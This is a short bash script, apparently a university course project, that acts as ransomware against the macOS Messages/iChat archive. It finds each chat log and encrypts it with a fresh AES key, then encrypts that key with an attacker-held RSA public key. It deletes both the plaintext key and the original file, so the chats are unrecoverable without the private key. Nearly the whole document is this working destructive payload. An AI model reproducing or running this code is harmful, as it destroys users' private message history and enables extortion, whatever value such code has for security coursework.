#!/bin/bash
PUBKEY=~/Documents/CIS/433project/applescript/id_rsa.pub
ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
MESSAGES=~/Library/Messages/Archive
DPATH=''

cd ${ARCHIVE}
if [ $? -eq 0 ]; then
    DPATH=$ARCHIVE
fi

cd ${MESSAGES}
if [ $? -eq 0 ]; then
    DPATH=$MESSAGES
fi

cd ${DPATH}
mkdir keys

find ./* -iname "*.ichat" | while read f
do
    KEY=keys/$(basename "${f}").key
    openssl rand 32 -out "$KEY"
    openssl enc -aes-256-cbc -salt -in "${f}" -out "${f}.enc" -k file:"${KEY}"
    openssl rsautl -encrypt -pubin -inkey <(ssh-keygen -e -f "${PUBKEY}" -m PKCS8) -in "$KEY" -out "${KEY}.enc" #encrypt key
    rm "$KEY" #delete plaintext key
    rm "${f}" #delete plaintext archive
done

